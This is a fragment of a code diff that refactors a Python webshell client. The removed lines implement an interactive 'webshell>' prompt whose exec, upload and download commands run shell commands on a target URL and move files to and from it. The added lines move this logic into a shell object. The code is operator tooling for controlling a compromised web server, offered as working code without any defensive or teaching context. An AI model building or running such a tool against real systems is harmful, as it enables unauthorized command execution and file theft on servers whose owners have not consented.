         if args.command:
-            run_command(args.url, sess, callback, args.command)
+            out = sh.exec_raw(args.command)
+            print(out if out is not None else '(no output)')
         else:
-            print(f'[*] Callback URL: {callback}')
-            print('    Commands:  exec <cmd> | upload <local> <remote> | '
-                  'download <remote> <local> | help | exit')
-            while True:
-                try:
-                    line = input('webshell> ').strip()
-                except (EOFError, KeyboardInterrupt):
-                    print()
-                    break
-                if not line:
-                    continue
-                parts = line.split(None, 1)
-                op = parts[0].lower()
-                arg = parts[1] if len(parts) > 1 else ''
-
-                if op in ('exit', 'quit'):
-                    break
-                elif op in ('exec', '!'):
-                    if arg:
-                        run_command(args.url, sess, callback, arg)
-                    else:
-                        print('usage: exec <command>')
-                elif op == 'upload':
-                    toks = arg.split()
-                    if len(toks) < 2:
-                        print('usage: upload <local> <remote>')
-                    else:
-                        upload_file(args.url, sess, callback, toks[0], toks[1])
-                elif op == 'download':
-                    toks = arg.split()
-                    if len(toks) < 2:
-                        print('usage: download <remote> <local>')
-                    else:
-                        download_file(args.url, sess, callback, toks[0], toks[1])
-                elif op == 'help':
-                    print('exec <cmd>               run a shell command, print output')
-                    print('upload <local> <remote>  write a local file to the target')
-                    print('download <remote> <local> read a target file to local disk')
-                    print('exit                     clean up and quit')
-                else:
-                    print('unknown command (type help)')
+            sh.interactive()
     finally:
-        cleanup(args.url, sess)
+        sh.cleanup()
+
+
+if __name__ == '__main__':
+    main()
